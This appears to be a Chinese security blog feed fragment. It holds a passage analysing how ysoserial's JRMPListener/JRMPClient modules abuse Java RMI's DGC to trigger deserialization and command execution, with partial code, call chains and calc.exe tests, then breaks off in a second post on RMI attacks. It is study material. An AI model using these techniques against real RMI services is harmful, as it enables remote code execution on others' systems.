Reflections.createWithConstructor(</span><br><span class="line">            ActivationGroupImpl.class,</span><br><span class="line">            RemoteObject.class,</span><br><span class="line">            new Class[]&#123;</span><br><span class="line">                RemoteRef.class</span><br><span class="line">            &#125;,</span><br><span class="line">            new Object[]&#123;</span><br><span class="line">                new UnicastServerRef(jrmpPort)</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        Reflections.getField(UnicastRemoteObject.class, &quot;port&quot;).set(uro, jrmpPort);</span><br><span class="line">        return uro;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main(final String[] args) throws Exception &#123;</span><br><span class="line">        PayloadRunner.run(JRMPListener.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它的 getObject 方法就是用来获取一个 UnicastRemoteObject 对象，这个对象被反序列化就会开启监听。</p><p>getObject 方法有一个参数，就是要设置的端口号，当目标服务器反序列化 UnicastRemoteObject 对象时，开启监听就是监听这个端口。</p><p>接着调用了 Reflections 的 createWithConstructor 方法。Reflections 是 ysoserial 中自定义的类，位于 ysoserial.payloads.util 包中。Reflections 的 createWithConstructor 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static &lt;T&gt; T createWithConstructor ( Class&lt;T&gt; classToInstantiate, Class&lt;? super T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span><br><span class="line">        throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">    Constructor&lt;? super T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line"> setAccessible(objCons);</span><br><span class="line">    Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line"> setAccessible(sc);</span><br><span class="line">    return (T)sc.newInstance(consArgs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法有四个参数，第一个参数是要被实例化的类，第二个参数是要被获取构造方法的类，第三个和第四个参数则分别是构造方法需要的参数类型和参数值。</p><p>所以这里调用 Reflections 的 createWithConstructor 方法实际是利用 RemoteObject 的构造方法创建了一个 ActivationGroupImpl 对象，并将 new UnicastServerRef(jrmpPort) 作为构造方法的参数：</p><img src="/images/QQ_1723910760462.png"><p>最后用 UnicastRemoteObject 接收，完成了向上转型。由于 ActivationGroupImpl 继承了 ActivationGroup ，ActivationGroup 又继承了 UnicastRemoteObject ，且 ActivationGroupImpl 和 ActivationGroup 都没有重写 readObject 方法，所以当 ActivationGroupImpl 对象被反序列化时，会调用 UnicastRemoteObject 的 readObject 方法。</p><p>事实上，这里除了使用 ActivationGroupImpl 类，直接使用 UnicastRemoteObject 类也是可以的。</p><p>后面主函数中调用的 PayloadRunner.run 方法就是先调用 JRMPListener 的 getObject 方法，将获取到的对象序列化再反序列化，只是测试用的。</p><p>那么到这里 payloads&#x2F;JRMPListener 就分析完了，接下来分析 exploit&#x2F;JRMPClient 。</p><h4 id="exploit-JRMPClient"><a href="#exploit-JRMPClient" class="headerlink" title="exploit&#x2F;JRMPClient"></a>exploit&#x2F;JRMPClient</h4><p>作者在本类的注释中说明了 exploit&#x2F;JRMPClient 的功能：</p><ol><li>目标是远程 DGC ，只要有监听，那么就一定存在 DGC（分布式垃圾回收）。</li><li>不反序列化任何数据，意思是不接收服务端发送的任何数据，这样就避免了被反过来攻击。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Generic JRMP client</span><br><span class="line"> * </span><br><span class="line"> * Pretty much the same thing as &#123;@link RMIRegistryExploit&#125; but </span><br><span class="line"> * - targeting the remote DGC (Distributed Garbage Collection, always there if there is a listener)</span><br><span class="line"> * - not deserializing anything (so you don&#x27;t get yourself exploited ;))</span><br><span class="line"> * </span><br><span class="line"> * @author mbechler</span><br><span class="line"> *</span><br><span class="line"> */</span><br></pre></td></tr></table></figure><p>exploit&#x2F;JRMPClient 中有一个主要的方法 makeDGCCall 和一个静态内部类 MarshalOutputStream 。</p><h6 id="makeDGCCall-方法"><a href="#makeDGCCall-方法" class="headerlink" title="makeDGCCall 方法"></a>makeDGCCall 方法</h6><ol><li><p><strong>参数说明</strong>：</p><ul><li><code>hostname</code>：目标主机名或 IP 地址。</li><li><code>port</code>：目标主机的端口号。</li><li><code>payloadObject</code>：需要发送的序列化对象。</li></ul></li><li><p><strong>建立连接</strong>：</p><img src="/images/QQ_1723933428087.png"><ul><li><code>SocketFactory.getDefault().createSocket(hostname, port)</code>：通过默认的套接字工厂创建与目标主机的 TCP 连接。</li><li><code>s.setKeepAlive(true)</code>：启用 TCP 的保活功能，以保持连接活跃。</li><li><code>s.setTcpNoDelay(true)</code>：禁用 Nagle 算法，立即发送数据，而不等待更多的数据。</li></ul></li><li><p><strong>准备数据流</strong>：</p><img src="/images/QQ_1723933451649.png"><ul><li><code>DataOutputStream</code>：包装 <code>OutputStream</code>，以便写入原始数据类型。</li></ul></li><li><p><strong>发送 RMI 协议的标志和版本信息</strong>：</p><img src="/images/QQ_1723933478376.png"><ul><li><code>Magic</code>：RMI 协议的标识符，用于验证连接。</li><li><code>Version</code>：协议版本号。</li><li><code>SingleOpProtocol</code>：指示该连接只用于单次操作。</li></ul></li><li><p><strong>发送 DGC 操作的调用标志</strong>：</p><img src="/images/QQ_1723933511287.png"><ul><li>发送一个字节，表示是一次 RMI 调用。</li></ul></li><li><p><strong>序列化对象并发送</strong>：</p><img src="/images/QQ_1723933610786.png"><ul><li><code>MarshalOutputStream</code> 就是 exploit&#x2F;JRMPClient 的静态内部类，一个自定义的 <code>ObjectOutputStream</code> 的子类，用于序列化对象。MarshalOutputStream 中并没有重写 writeLong 、writeInt 等方法，实际还是调用的 ObjectOutputStream 中的方法。</li><li>发送一些固定的标识符和数据，用于 DGC 协议。</li><li>最后，序列化并发送 <code>payloadObject</code> 。</li></ul></li><li><p><strong>清理资源</strong>：</p><img src="/images/QQ_1723933974996.png"><ul><li>确保在方法结束时关闭数据流和套接字，以释放资源。</li></ul></li></ol><h6 id="main-方法"><a href="#main-方法" class="headerlink" title="main 方法"></a>main 方法</h6><img src="/images/QQ_1724056250811.png"><p>在主函数中先是判断了一下参数长度是否小于 4 ，如果小于 4 的话输出报错信息：<host> <port> <payload_type> <payload_arg>，这意味这要想成功运行 exploit&#x2F;JRMPClient 需要提供四个参数：主机地址、端口号、payload 类型、payload 参数（也就是要执行的命令），就像这样：<br><img src="/images/QQ_1724056537568.png"></p><p>接着用 Utils.makePayloadObject 创建 payload 对象，这里用到了参数 3 和参数 4 。Utils 是 ysoserial 中自定义的工具类，位于 ysoserial.payloads 包中，它的 makePayloadObject 方法会根据要使用的 gadget 和要执行的命令创建 payload 对象。这里就不深究了。</p><p>最后就是调用 makeDGCCall 方法将 payload 对象序列化发送到目标地址。</p><h4 id="DGC-处理逻辑"><a href="#DGC-处理逻辑" class="headerlink" title="DGC 处理逻辑"></a>DGC 处理逻辑</h4><p>客户端发送的 payload ，其实是利用了服务端的 DGC 机制来反序列化，那么就具体来看 DGC 端的处理逻辑。</p><h6 id="DGC-创建"><a href="#DGC-创建" class="headerlink" title="DGC 创建"></a>DGC 创建</h6><p>在远程对象导出的时候，最终我们是来到了 ObjectTable 的 putTarget(Target) 方法。</p><p>回顾一下远程对象导出流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">UnicastRemoteObject#exportObject(Remote, UnicastServerRef)</span><br><span class="line">UnicastServerRef#exportObject(Remote, Object, boolean)</span><br><span class="line">-&gt; Util#createProxy(Class&lt;?&gt;, RemoteRef, boolean) // 创建代理对象</span><br><span class="line">-&gt; LiveRef#exportObject(Target)</span><br><span class="line">   TCPEndpoint#exportObject(Target)</span><br><span class="line">   TCPTransport#exportObject(Target)</span><br><span class="line">       -&gt; TCPTransport#listen()// 开启监听</span><br><span class="line">       -&gt; Transport#exportObject(Target)</span><br><span class="line">          ObjectTable#putTarget(Target)// 远程对象导出</span><br></pre></td></tr></table></figure><p>ObjectTable 的 putTarget 方法：</p><img src="/images/QQ_1724059306246.png"><p>这里调用了 DGCImpl 的静态变量 dgcLog ，那么在调用静态变量之前就会对 DGCImpl 进行初始化，就会执行 DGCImpl 的静态代码块。</p><p>DGCImpl 的静态代码块就是新开一个线程，获取一个 DGCImpl 对象，然后把 DGCImpl 对象封装进一个 Target 对象里面，最后又调用 </p><p>ObjectTable 的 putTarget 方法将这个 Target 对象注册到 ObjectTable 中，使其可以通过 RMI 系统访问：</p><img src="/images/QQ_1724060483208.png"><p>以上就是 DGC 被创建的过程。</p><h6 id="DGC-调用"><a href="#DGC-调用" class="headerlink" title="DGC 调用"></a>DGC 调用</h6><p>当客户端向服务端发起通信时，服务端会调用 TCPTransport 的 handleMessages 来处理请求，与 RMI 调用相似。</p><p>来回顾一下服务端的处理逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TCPTransport$ConnectionHandler.run0</span><br><span class="line">TCPTransport.handleMessages</span><br><span class="line">Transport.serviceCall</span><br><span class="line">UnicastServerRef.dispatch</span><br><span class="line">UnicastServerRef.oldDispatch</span><br></pre></td></tr></table></figure><p>而最终调用 RegistryImpl_Skel 的 dispatch 还是 DGCImpl_Skel 的 dispatch 是在 Transport.serviceCall 方法中判断的。</p><p>exploit&#x2F;JRMPClient 的 makeDGCCall 方法向数据流中写入了很多数据，我们可以看看这些数据是如何被接收的。</p><p>TCPTransport$ConnectionHandler.run0 方法从数据流中读取数据，这里读取一个 int 数据：</p><img src="/images/QQ_1724168702468.png"><p>然后又读取一个 short 数据：</p><img src="/images/QQ_1724168768275.png"><p>然后又读取一个 byte 数据，进入 switch 选择语句：</p><img src="/images/QQ_1724168820419.png"><p>这与 exploit&#x2F;JRMPClient 的 makeDGCCall 方法第四步：发送 RMI 协议的标志和版本信息，相对应起来了。</p><p>由于前面客户端发送的是 TransportConstants.SingleOpProtocol，所以这里进入 <code>case TransportConstants.SingleOpProtocol</code> ，也就会调用 handleMessages 。</p><p>在 TCPTransport 的 handleMessages 方法中也有与 exploit&#x2F;JRMPClient 的 makeDGCCall 方法第五步对应的 read 方法的调用：<br><img src="/images/QQ_1724174173215.png"></p><p>接下来调用 Transport 的 serviceCall 方法：</p><img src="/images/QQ_1724178566157.png"><p>跟进 Transport 的 serviceCall 方法：</p><img src="/images/QQ_1724163908708.png"><p>可以看到，这里定义了一个参数 id ，这个 id 是通过读取参数 call 的输入流来获取的。</p><p>跟进一下 ObjID.read 方法：</p><img src="/images/QQ_1724178878201.png"><p>这里读取了一个 long 数据。</p><p>再跟进 UID.read 方法：</p><img src="/images/QQ_1724178953778.png"><p>连续读取了 int、long、short 数据。</p><p>这两步与 exploit&#x2F;JRMPClient 的 makeDGCCall 方法的第六步相对应，那里写入的数值正是用来设置这个 id 值的，往后看会发现这样设置是为了使 id 值与 dgcID 相等。</p><p>回到 Transport 的 serviceCall 方法，接着对这个 id 进行一个判断，如果 id 等于 dgcID ，那么会将 Transport 对象设置为空，否则设置成当前类。之后又会利用 id 和这个 Transport 对象构造一个 Target 对象：</p><img src="/images/QQ_1724164146984.png"><p>调试起来会发现 dgcID 的值如图所示，而此时 id 的值与之相等：</p><img src="/images/QQ_1724174049827.png"><p>此时获取到的 Target 对象中包含的 skel 就已经是 DGCImpl_Skel 对象了，所以其实在这里就决定了最后调用的是 RegistryImpl_Skel 还是 DGCImpl_Skel ：<br><img src="/images/QQ_1724177054444.png"></p><p>然后获取 Target 对象中的 disp 属性，也就是一个 UnicastServerRef 对象，最后调用 UnicastServerRef 的 dispatch 方法：</p><img src="/images/QQ_1724164356124.png"><p>UnicastServerRef 的 dispatch 方法会调用其 oldDispatch 方法，还读取了一个 int 数据，将 num 设置为 1 ，然后作为 oldDispatch 的 参数传入：</p><img src="/images/QQ_1724179555971.png"><p>UnicastServerRef 的 oldDispatch 方法读取了最后一个 long 数据，到这里数据流中写入的数据就被读取完了，这里的 op 是 1，hash 是 -669196253586618813L，作为 skel.dispatch 方法的参数传入：<br><img src="/images/QQ_1724179804780.png"></p><p>接着会调用 DGCImpl_Skel 的 dispatch 方法，首先会判断这个 hash 值是否等于 -669196253586618813L ：</p><img src="/images/QQ_1724179898057.png"><p>所以 exploit&#x2F;JRMPClient 才要往数据流中写入一个那样的数据。</p><p>此时 opnum 值为 1 ，进入 case 1：</p><img src="/images/QQ_1724181015341.png"><p>case0 和 case1 的区别在于 case0 调用 clean 方法，而 case1 调用 dirty 方法。这里选用了 case1 。</p><p>最后在这里触发反序列化。</p><p>以上就是 DGC 调用的过程了，exploit&#x2F;JRMPClient 向数据流写入的每一个数据都是有意义的，不得不赞叹其精妙。</p><h4 id="测试使用"><a href="#测试使用" class="headerlink" title="测试使用"></a>测试使用</h4><p>先启动 payloads&#x2F;JRMPListener ，再启动 exploit&#x2F;JRMPClient（记得启动时要带上参数），我爆出了如下错误：</p><img src="/images/QQ_1724183339425.png"><p>看来是被拦截了，有某种安全机制阻止我反序列化 HashSet 这个类。可能是高版本的 JEP 290 导致的。</p><p>将 JDK 版本降为 8u65 后成功运行并弹出计算器：</p><img src="/images/QQ_1724184133250.png"><h3 id="exploit-JRMPListener-payloads-JRMPClient"><a href="#exploit-JRMPListener-payloads-JRMPClient" class="headerlink" title="exploit&#x2F;JRMPListener + payloads&#x2F;JRMPClient"></a>exploit&#x2F;JRMPListener + payloads&#x2F;JRMPClient</h3><p>攻击流程如下：</p><p>1、攻击方在自己的服务器使用 exploit&#x2F;JRMPListener 开启一个 rmi 监听</p><p>2、往存在漏洞的服务器发送 payloads&#x2F;JRMPClient ，payload 中已经设置了攻击者服务器 ip 及 JRMPListener 监听的端口，漏洞服务器反序列化该 payload 后，会去连接攻击者开启的 rmi 监听，在通信过程中，攻击者服务器会发送一个可执行命令的 payload，从而达到命令执行的目的。</p><h4 id="payloads-JRMPClient"><a href="#payloads-JRMPClient" class="headerlink" title="payloads&#x2F;JRMPClient"></a>payloads&#x2F;JRMPClient</h4><p>作者在注释中给出了调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">* UnicastRef.newCall(RemoteObject, Operation[], int, long)</span><br><span class="line">* DGCImpl_Stub.dirty(ObjID[], long, Lease)</span><br><span class="line">* DGCClient$EndpointEntry.makeDirtyCall(Set&lt;RefEntry&gt;, long)</span><br><span class="line">* DGCClient$EndpointEntry.registerRefs(List&lt;LiveRef&gt;)</span><br><span class="line">* DGCClient.registerRefs(Endpoint, List&lt;LiveRef&gt;)</span><br><span class="line">* LiveRef.read(ObjectInput, boolean)</span><br><span class="line">* UnicastRef.readExternal(ObjectInput)</span><br><span class="line">*</span><br><span class="line">* Thread.start()</span><br><span class="line">* DGCClient$EndpointEntry.&lt;init&gt;(Endpoint)</span><br><span class="line">* DGCClient$EndpointEntry.lookup(Endpoint)</span><br><span class="line">* DGCClient.registerRefs(Endpoint, List&lt;LiveRef&gt;)</span><br><span class="line">* LiveRef.read(ObjectInput, boolean)</span><br><span class="line">* UnicastRef.readExternal(ObjectInput)</span><br></pre></td></tr></table></figure><p>从下往上看，入口点是 UnicastRef 的 readExternal 方法。UnicastRef 继承了 java.io.Externalizable ，所以在反序列化时会触发其 readExternal 方法。</p><p>然后在 DGCClient.registerRefs(Endpoint, List<LiveRef>) 处出现分支选项，所以出现两条链子。</p><p>来看代码，payloads&#x2F;JRMPClient 的 getObject 方法：</p><img src="/images/QQ_1724289641064.png"><p>首先是从参数中分割出主机名和端口号，如果没有设置，则随机生成一个端口号。</p><p>然后获取一个 UnicastRef 对象，设置好参数。再将其封装进 RemoteObjectInvocationHandler 对象，最后利用这个 RemoteObjectInvocationHandler 对象生成一个代理对象。那么这个 proxy 在被反序列化时就会先调用 RemoteObjectInvocationHandler 的父类 RemoteObject 的 readObject 方法。</p><p>接下来看 main 方法：</p><img src="/images/QQ_1724292494481.png"><p>第一行是将当前线程的上下文类加载器（Context ClassLoader）设置为 <code>JRMPClient</code> 类的类加载器。</p><p>第二行就是调用 PayloadRunner.run 方法，前面说过了，PayloadRunner.run 方法就是先调用传入对象的 getObject 方法，将获取到的对象序列化再反序列化。</p><p>下面我们调试一下 payloads&#x2F;JRMPClient 。在 RemoteObject.readObject 和 UnicastRef.readExternal 处下好断点，开始调试：</p><p>首先来到了 PayloadRunner.run 方法：</p><img src="/images/QQ_1724293269674.png"><p>这里调用 getObject 方法时为其设置的参数是 “calc.exe” ，我觉得很奇怪，继续跟进 payloads&#x2F;JRMPClient 的 getObject 方法往下看：</p><img src="/images/QQ_1724293449076.png"><p>果然获取到的 host 是 “calc.exe” ，而端口号是随机生成的 11871 。</p><p>之后就是把这个 host 封装进了 TCPEndpoint ：</p><img src="/images/QQ_1724293884566.png"><p>后面就没什么可看的了，回到 PayloadRunner.run：</p><img src="/images/QQ_1724293980794.png"><p>接下来会调用 Serializer.serialize 将结果序列化。</p><p>跟进 Serializer.serialize：</p><img src="/images/QQ_1724294079895.png"><p>最后所有的一切都会封装进 serialized 数组，然后调用 Deserializer.deserialize 将其反序列化：</p><img src="/images/QQ_1724294231110.png"><p>Deserializer.deserialize：</p><img src="/images/QQ_1724294411540.png"><p>以上就是 PayloadRunner.run 方法的工作流程。</p><p>继续跟进，来到了 RemoteObject.readObject 方法：</p><img src="/images/QQ_1724294547847.png"><p>在方法的最后调用 ref.readExternal ，也就是 UnicastRef.readExternal 方法。</p><p>继续跟进 UnicastRef.readExternal 方法：</p><img src="/images/QQ_1724295149656.png"><p>调用 LiveRef.read ，继续跟进 LiveRef.read ：</p><img src="/images/QQ_1724295257151.png"><p>在方法的最后调用了 DGCClient.registerRefs ，跟进它：</p><img src="/images/QQ_1724295325919.png"><p>在这里分化出了两条路，一条是 EndpointEntry.lookup ，一条是 EndpointEntry.registerRefs 。</p><p>先来看 EndpointEntry.lookup ：</p><img src="/images/QQ_1724295772484.png"><p>这里调用了 DGCClient$EndpointEntry 的构造方法，跟进它：</p><img src="/images/QQ_1724297323680.png"><p>这里调用了 renewCleanThread.start ，其实就是 Thread.start ，单开一个线程用于通信。</p><p>那么这个分支就结束了。</p><p>接下来看另一边 EndpointEntry.registerRefs ，在 EndpointEntry.registerRefs 方法的最后调用了 makeDirtyCall ：</p><img src="/images/QQ_1724298026501.png"><p>跟进 DGCClient$EndpointEntry.makeDirtyCall 方法：</p><img src="/images/QQ_1724298246831.png"><p>这里调用了 dgc.dirty ，也就是 DGCImpl_Stub 的 dirty 方法，跟进它：</p><img src="/images/QQ_1724298359708.png"><p>这个方法的架构和 RegistryImpl_Stub 的 bind 方法差不多，都调用了 UnicastRef 的 newCall 方法、invoke 方法和 done 方法。</p><p>UnicastRef 的 newCall 方法发起一个远程调用，并传递相关的信息；invoke 方法执行实际的远程方法调用，负责整个从发起调用到接收结果的过程。它处理了网络通信、序列化&#x2F;反序列化、以及异常处理；done 方法在远程方法调用结束后进行资源清理和上下文关闭，确保系统资源得以释放，避免资源泄漏。</p><p>UnicastRef 的 invoke 方法：</p><img src="/images/QQ_1724312349091.png"><p>调用 call.executeCall() ，实际上是调的 StreamRemoteCall.executeCall() 方法。</p><p>StreamRemoteCall 的 executeCall() 方法：</p><img src="/images/QQ_1724312870988.png"><p>这里根据 returnType 来判断如果正常的话直接返回，异常的话则反序列化服务端传来的对象。</p><p>回到 DGCImpl_Stub 的 dirty 方法，在上一步中如果判断正常，那么最后是在这里反序列化：</p><img src="/images/QQ_1724308437303.png"><p>到这里 payloads&#x2F;JRMPClient 就分析完了。大体上就是开启监听（以便于与 exploit&#x2F;JRMPListener 通信），然后调用 dirty 方法，反序列化攻击服务端传过来的数据，从而造成攻击。</p><h4 id="exploit-JRMPListener"><a href="#exploit-JRMPListener" class="headerlink" title="exploit&#x2F;JRMPListener"></a>exploit&#x2F;JRMPListener</h4><h6 id="main-方法-1"><a href="#main-方法-1" class="headerlink" title="main 方法"></a>main 方法</h6><img src="/images/QQ_1724717615699.png"><p>main 方法中同样提示了使用此类需要三个参数：端口号、payload 类型、payload 参数（也就是要执行的命令）。</p><p>接着调用了 JRMPListener 的 run 方法，且存在调用链：main -&gt; run -&gt; doMessage -&gt; doCall 。</p><h6 id="run-方法"><a href="#run-方法" class="headerlink" title="run 方法"></a>run 方法</h6><p>run 方法实现了一个简单的多线程服务器，用于接收和处理来自客户端的连接，并基于传输协议进行相应的操作。run 方法首先会从数据流中读取数据：</p><img src="/images/QQ_1724753461829.png"><p>然后会根据 protocol 的值来调用不同的处理逻辑：</p><img src="/images/QQ_1724753578494.png"><p>无论是第一种基于流的协议，还是第二种用于单次操作的协议，最后都会调用 doMessage 方法。如果是其他的协议则会报错。JRMP 协议通常是基于流的，所以会走第一个 case 。</p><h6 id="doMessage-方法"><a href="#doMessage-方法" class="headerlink" title="doMessage 方法"></a>doMessage 方法</h6><p>doMessage 方法同样是根据接收到的数据执行不同的操作：</p><img src="/images/QQ_1724754810299.png"><p>如果接收到的数据是一个 RMI 请求，那么调用 doCall 方法；</p><p>如果是一个 ping 消息，那么响应一个 PingAck 消息，表示服务器收到了 ping 请求并确认连接正常；</p><p>如果是一个 DGC 的应答包，那么使用 UID.read(in) 从输入流中读取 UID 对象，这通常与远程对象的生命周期管理相关。</p><h6 id="doCall-方法"><a href="#doCall-方法" class="headerlink" title="doCall 方法"></a>doCall 方法</h6><p>docall 方法首先是定义了一个匿名内部类 ObjectInputStream ，重写了 ObjectInputStream 中的 resolveClass 方法，然后实例化了一个对象：</p><img src="/images/QQ_1724809147946.png"><p>匿名内部类没有名字，并且在定义时就直接实例化。它允许你在方法内部或局部范围内定义类，同时重写或扩展父类（或接口）的功能。</p><p>在这个匿名内部类中，重写了 ObjectInputStream 的 resolveClass 方法。resolveClass 方法的作用是在反序列化过程中，根据 ObjectStreamClass 对象的描述信息来加载实际的类。</p><p>如果类名是 “[Ljava.rmi.server.ObjID;”（表示 ObjID[] 数组），则返回 ObjID[].class 。</p><p>如果类名是 “java.rmi.server.ObjID”，则返回 ObjID.class 。</p><p>如果类名是 “java.rmi.server.UID”，则返回 UID.class 。</p><p>如果遇到其他类名，则抛出 IOException 。</p><p>也就是说，在这里允许反序列化的类有三个：ObjID[].class 、ObjID.class 和 UID.class 。其他的类是不允许反序列化的，这样就避免了服务端被攻击。</p><p>接下来 doCall 方法读取了一个 ObjID 对象，并且如果 read.hashCode() &#x3D;&#x3D; 2 ，那么表示这是一次 DGC 调用：</p><img src="/images/QQ_1724809638320.png"><p>read.hashCode() 方法其实就是返回了它的 objNum 属性：</p><img src="/images/QQ_1724809751613.png"><p>前面在分析 DGC 处理逻辑的时候也提到了 ObjID 对象的 objNum 属性值是 2 ，这里放一张原图吧：</p><img src="/images/QQ_1724174049827.png"><p>所以 doCall 也通过这种方式来判断是否是 DGC 调用。</p><p>doCall 方法的最后，服务端向客户端返回一个 BadAttributeValueExpException 异常，恶意对象 payload 就被放置在这个 BadAttributeValueExpException 的 val 属性值当中了：</p><img src="/images/QQ_1724810206150.png"><p>这里写入数据 <code>oos.writeByte(TransportConstants.ExceptionalReturn)</code> 表明是一个异常返回，其值是 2 ：</p><img src="/images/QQ_1724810724663.png"><p>payloads&#x2F;JRMPClient 中提到过，客户端应该是在 StreamRemoteCall 的 executeCall() 方法反序列化：</p><img src="/images/QQ_1724312870988.png"><p>那么 exploit&#x2F;JRMPListener 的分析到这里就结束了。</p><h4 id="测试使用-1"><a href="#测试使用-1" class="headerlink" title="测试使用"></a>测试使用</h4><p>在测试之前，先修改一下 PayloadRunner.run 方法，因为在前面调试的时候知道这个 run 方法为 getObject 方法设置的参数不合理，所以这里修改一下参数：</p><img src="/images/QQ_1724813562015.png"><p>然后为 exploit&#x2F;JRMPListener 设置一下运行参数：</p><img src="/images/QQ_1724813749790.png"><p>先启动 exploit&#x2F;JRMPListener ，再运行 payloads&#x2F;JRMPClient ，就可以成功弹出计算器了：</p><img src="/images/QQ_1724813809584.png"><p>事实上，如果参数可控，那么只要客户端向恶意服务端执行了一个 lookup 方法，就会遭受攻击：</p><img src="/images/QQ_1724813922372.png"><p>这样也是可以的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>ysoserial 中的 JRMP 模块可以作为针对 DGC 攻击的经典范例。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qsort_/article/details/104969138">ysoserial exploit&#x2F;JRMPListener 原理剖析</a></p><p><a href="https://blog.csdn.net/qsort_/article/details/104874111">ysoserial exploit&#x2F;JRMPClient 原理剖析</a></p><p><a href="https://stoocea.github.io/post/JRMPListener%20Client%E5%AD%A6%E4%B9%A0.html#JRMPClient-%E8%B0%83%E8%AF%95">Ysoserial-JRMPListener&#x2F;JRMPClient 学习</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JRMP-协议介绍&quot;&gt;&lt;a href=&quot;#JRMP-协议介绍&quot; class=&quot;headerlink&quot; title=&quot;JRMP 协议介绍&quot;&gt;&lt;/a&gt;JRMP 协议介绍&lt;/h2&gt;&lt;p&gt;JRMP（Java Remote Method Protocol）是为 Java R</summary>
      
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞篇 - RMI 相关的攻击</title>
    <link href="https://changeyourway.github.io/2024/08/28/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-RMI%E7%9B%B8%E5%85%B3%E7%9A%84%E6%94%BB%E5%87%BB/"/>
    <id>https://changeyourway.github.io/2024/08/28/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-RMI%E7%9B%B8%E5%85%B3%E7%9A%84%E6%94%BB%E5%87%BB/</id>
    <published>2024-08-28T03:26:44.848Z</published>
    <updated>2024-08-28T03:30:01.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="攻击-RMI"><a href="#攻击-RMI" class="headerlink" title="攻击 RMI"></a>攻击 RMI</h2><p>前置知识：<a href="https://changeyourway.github.io/2024/07/08/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-RMI%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E5%8D%8F%E8%AE%AE/#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%8E%B7%E5%8F%96-Registry-%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1">基础篇 - RMI 协议详解</a> </p><p>我们可以将参与 RMI 远程调用的角色分为三个：Server 端、Registry 端、Client 端（一般来说 Server 端和 Registry 端在一起），它们三者之间都会进行通信，并且全部的通信流程均通过序列化与反序列化实现。基于此，我们可以实现反序列化攻击。</p><h3 id="攻击-Server-端"><a href="#攻击-Server-端" class="headerlink" title="攻击 Server 端"></a>攻击 Server 端</h3><h4 id="参数反序列化"><a href="#参数反序列化" class="headerlink" title="参数反序列化"></a>参数反序列化</h4><p>如果服务端提供的服务对象参数是 Object 类型，那么意味着客户端远程调用时可以传递任意类型的参数，这个参数将会被序列化发送到服务端，然后在服务端反序列化。</p><p>例如，服务端的 SayHello 服务有一个方法 eval ，其参数是 Object 类型：</p><img src="/images/image-20240708164106474.png"><p>以 CC6 弹计算器为例（前提是服务端有 CC 依赖），客户端传递一个恶意对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 